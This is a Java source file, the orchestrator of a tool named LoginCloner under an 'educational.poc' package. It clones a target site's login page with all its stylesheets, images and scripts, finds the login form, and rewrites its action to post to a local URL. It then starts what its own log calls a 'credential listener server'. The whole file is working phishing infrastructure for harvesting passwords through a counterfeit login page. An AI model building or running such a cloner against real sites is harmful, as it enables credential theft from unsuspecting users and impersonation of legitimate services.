package com.educational.poc.LoginCloner.core;

import com.educational.poc.LoginCloner.detect.IFormDetector;
import com.educational.poc.LoginCloner.download.IDownloader;
import com.educational.poc.LoginCloner.fetch.IFetcher;
import com.educational.poc.LoginCloner.parse.ICssParser;
import com.educational.poc.LoginCloner.parse.IHtmlParser;
import com.educational.poc.LoginCloner.server.IServer;
import com.educational.poc.LoginCloner.update.ILinkUpdater;
import com.educational.poc.LoginCloner.util.DirectoryManager;
import com.educational.poc.LoginCloner.util.PathUtils;
import com.educational.poc.LoginCloner.write.IDocumentWriter;
import com.educational.poc.LoginCloner.write.IResourceWriter;

import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

/**
 * Orchestrates the login page cloning process using injected components.
 */
public class LoginClonerOrchestrator {

    private final IFetcher fetcher;
    private final IHtmlParser htmlParser;
    private final ICssParser cssParser;
    private final IDownloader downloader;
    private final IResourceWriter resourceWriter;
    private final ILinkUpdater linkUpdater;
    private final IFormDetector formDetector;
    private final IDocumentWriter documentWriter;
    private final IServer server;

    // Configuration constants (could also be injected)
    private final Path outputHtmlPath = Configuration.OUTPUT_FILE_PATH;
    private final Path assetsRootDir = Configuration.ASSETS_DIR;
    private final Path cssDir = Configuration.CSS_DIR;
    private final Path imgDir = Configuration.IMG_DIR;
    private final Path scriptDir = Configuration.SCRIPT_DIR;
    private final Path otherDir = Configuration.OTHER_DIR;
    private final String serverActionUrl = Configuration.SERVER_ACTION_URL;

    public LoginClonerOrchestrator(IFetcher fetcher, IHtmlParser htmlParser, ICssParser cssParser,
                                   IDownloader downloader, IResourceWriter resourceWriter, ILinkUpdater linkUpdater,
                                   IFormDetector formDetector, IDocumentWriter documentWriter, IServer server) {
        this.fetcher = fetcher;
        this.htmlParser = htmlParser;
        this.cssParser = cssParser;
        this.downloader = downloader;
        this.resourceWriter = resourceWriter;
        this.linkUpdater = linkUpdater;
        this.formDetector = formDetector;
        this.documentWriter = documentWriter;
        this.server = server;
    }

    /**
     * Runs the cloning process for the given URL.
     * @param targetUrl The URL of the page to clone.
     */
    public void run(String targetUrl) {
        try {
            // 1. Setup Directories
            DirectoryManager.createOutputDirectories(cssDir, imgDir, otherDir, scriptDir);

            // 2. Fetch HTML
            Document document = fetcher.fetch(targetUrl);
            if (document == null) {
                // Error already logged by fetcher
                return;
            }
            String baseUri = document.baseUri(); // Needed for resolving relative URLs

            // 3. Process External Resources (CSS, Images, Scripts)
            List<IHtmlParser.ResourceInfo> externalResources = htmlParser.findExternalResources(document);
            for (IHtmlParser.ResourceInfo resource : externalResources) {
                processResource(resource.url, resource.element, resource.attributeName, resource.type, document);
            }

            // 4. Process Inline Style Resources
            // Note: RelativeLinkUpdater currently skips robust inline style updates.
            Map<Element, List<String>> inlineStyleResources = htmlParser.findInlineStyleResources(document);
             for (Map.Entry<Element, List<String>> entry : inlineStyleResources.entrySet()) {
                 Element styledElement = entry.getKey();
                 List<String> assetUrls = entry.getValue();
                 for (String assetUrl : assetUrls) {
                     // Treat inline style assets like 'OTHER' for now
                     processResource(assetUrl, styledElement, "style", IHtmlParser.ResourceType.INLINE_STYLE_ASSET, document);
                 }
             }

            // 5. Find and Modify Login Form
            Element loginForm = formDetector.findLoginForm(document);

            if (loginForm != null) {
                System.out.println("Login form detected. Modifying action...");
                formDetector.modifyLoginFormAction(loginForm, serverActionUrl, "POST");

                // 6. Save Modified HTML
                System.out.println("Saving modified HTML document...");
                boolean saved = documentWriter.write(document, outputHtmlPath);

                if (saved) {
                    System.out.println("Cloned page saved successfully to: " + outputHtmlPath.toAbsolutePath());
                    // 7. Start Server (only if HTML saved successfully)
                    System.out.println("Starting credential listener server...");
                    server.start();
                    // Add shutdown hook to stop the server gracefully
                    Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                        System.out.println("Shutdown hook triggered. Stopping server...");
                        server.stop();
                    }));
                } else {
                    System.err.println("Failed to save cloned page to: " + outputHtmlPath.toAbsolutePath());
                }

            } else {
                System.out.println("No suitable login form detected. Saving page without form modification.");
                 // Still save the page even if no form is found, as assets are downloaded.
                 boolean saved = documentWriter.write(document, outputHtmlPath);
                 if (saved) {
                     System.out.println("Page (without login form modification) saved successfully to: " + outputHtmlPath.toAbsolutePath());
                 } else {
                     System.err.println("Failed to save page to: " + outputHtmlPath.toAbsolutePath());
                 }
            }

        } catch (IOException e) {
            System.err.println("An error occurred during the cloning process: " + e.getMessage());
            // e.printStackTrace(); // Uncomment for detailed debugging
        } catch (Exception e) {
             System.err.println("An unexpected error occurred: " + e.getMessage());
             // e.printStackTrace();
        }
    }

    /**
     * Helper method to download, save, and update link for a single resource.
     * Also handles processing of CSS files.
     */
    private void processResource(String resourceUrl, Element element, String attributeName, IHtmlParser.ResourceType type, Document containingDocument) {
        Path targetDir;
        switch (type) {
            case CSS_LINK: targetDir = cssDir; break;
            case IMAGE: targetDir = imgDir; break;
            case SCRIPT: targetDir = scriptDir; break;
            case INLINE_STYLE_ASSET: // Fallthrough intentional
            case OTHER:
            default: targetDir = otherDir; break;
        }

        try {
            String sanitizedFileName = PathUtils.sanitizeFileName(new URI(resourceUrl).getPath());
            Path localPath = PathUtils.getUniqueLocalPath(targetDir, sanitizedFileName);

            System.out.println("  Processing Resource (" + type + "): " + resourceUrl);
            System.out.println("    -> Target local path: " + localPath);

            InputStream inputStream = downloader.download(resourceUrl);
            if (inputStream != null) {
                boolean written = resourceWriter.write(inputStream, localPath); // Writer closes the stream
                if (written) {
                    // Update the link in the main HTML document
                    if (type != IHtmlParser.ResourceType.INLINE_STYLE_ASSET) {
                         linkUpdater.updateElementLink(element, attributeName, localPath, outputHtmlPath);
                    } else {
                        // Handle inline style update (currently limited in RelativeLinkUpdater)
                        linkUpdater.updateInlineStyleLink(element, resourceUrl, localPath, outputHtmlPath);
                    }


                    // If the downloaded resource is CSS, process its internal URLs
                    String contentType = null;
                    try { contentType = Files.probeContentType(localPath); } catch (IOException ioe) { /* ignore */ }

                    if (type == IHtmlParser.ResourceType.CSS_LINK || (contentType != null && contentType.equals("text/css"))) {
                        processCssInternalUrls(localPath, resourceUrl);
                    }
                } else {
                    System.err.println("    Failed to write resource to disk: " + localPath);
                }
            } else {
                 System.err.println("    Failed to download resource: " + resourceUrl);
            }

        } catch (URISyntaxException e) {
             System.err.println("    Skipping invalid resource URL: " + resourceUrl + " (" + e.getMessage() + ")");
        } catch (IOException e) {
            System.err.println("    IOException processing resource " + resourceUrl + ": " + e.getMessage());
        } catch (Exception e) {
            System.err.println("    Unexpected error processing resource " + resourceUrl + ": " + e.getMessage());
            // e.printStackTrace();
        }
    }

    /**
     * Processes a downloaded CSS file to find, download, and rewrite internal url() references.
     * @param localCssPath Path to the downloaded CSS file.
     * @param originalCssUrl The original URL the CSS file was downloaded from (for resolving relative assets).
     */
    private void processCssInternalUrls(Path localCssPath, String originalCssUrl) {
        System.out.println("    Processing CSS file for internal assets: " + localCssPath.getFileName());
        try {
            String cssContent = Files.readString(localCssPath, StandardCharsets.UTF_8);
            List<String> internalUrls = cssParser.findResourceUrls(cssContent);
            String updatedCssContent = cssContent;
            boolean cssChanged = false;

            if (internalUrls.isEmpty()) {
                 System.out.println("      No internal url() references found.");
                 return;
            }
             System.out.println("      Found " + internalUrls.size() + " internal url() references.");


            for (String relativeAssetRef : internalUrls) {
                try {
                    // Resolve the asset URL relative to the *original CSS file's URL*
                    URI baseCssUri = new URI(originalCssUrl);
                    URI absoluteAssetUri = baseCssUri.resolve(relativeAssetRef);
                    String absoluteAssetUrl = absoluteAssetUri.toString();

                    System.out.println("        Found internal asset: " + relativeAssetRef + " -> " + absoluteAssetUrl);

                    // Download and save the asset (typically to 'other' or a dedicated 'fonts'/'css_assets' dir)
                    // Using OTHER_DIR for simplicity here.
                    String sanitizedAssetName = PathUtils.sanitizeFileName(absoluteAssetUri.getPath());
                    Path localAssetPath = PathUtils.getUniqueLocalPath(otherDir, sanitizedAssetName);

                    InputStream assetStream = downloader.download(absoluteAssetUrl);
                    if (assetStream != null) {
                        boolean assetWritten = resourceWriter.write(assetStream, localAssetPath);
                        if (assetWritten) {
                            // Calculate relative path from the *CSS file's location* to the asset's location
                            Path cssParentDir = localCssPath.getParent();
                            if (cssParentDir == null) cssParentDir = Path.of(".");
                            Path relativePathFromCss = cssParentDir.relativize(localAssetPath);
                            String relativeUriForCss = PathUtils.encodePathToUri(relativePathFromCss.toString());

                            // Replace the original relative reference in the CSS content string
                            String newCss = cssParser.replaceUrl(updatedCssContent, relativeAssetRef, relativeUriForCss);
                            if (!newCss.equals(updatedCssContent)) {
                                updatedCssContent = newCss;
                                cssChanged = true;
                                 System.out.println("        Updated internal CSS path: '" + relativeAssetRef + "' -> '" + relativeUriForCss + "'");
                            }
                        } else {
                             System.err.println("        Failed to write internal asset: " + localAssetPath);
                        }
                    } else {
                         System.err.println("        Failed to download internal asset: " + absoluteAssetUrl);
                    }
                } catch (URISyntaxException | IOException e) {
                    System.err.println("        Error processing internal CSS asset ref '" + relativeAssetRef + "': " + e.getMessage());
                } catch (Exception e) {
                     System.err.println("        Unexpected error processing internal CSS asset ref '" + relativeAssetRef + "': " + e.getMessage());
                }
            }

            // If any URLs were replaced, overwrite the CSS file
            if (cssChanged) {
                System.out.println("    Rewriting CSS file with updated internal asset paths: " + localCssPath.getFileName());
                resourceWriter.writeString(updatedCssContent, localCssPath);
            }

        } catch (IOException e) {
            System.err.println("    Error reading or writing CSS file " + localCssPath + ": " + e.getMessage());
        }
    }
}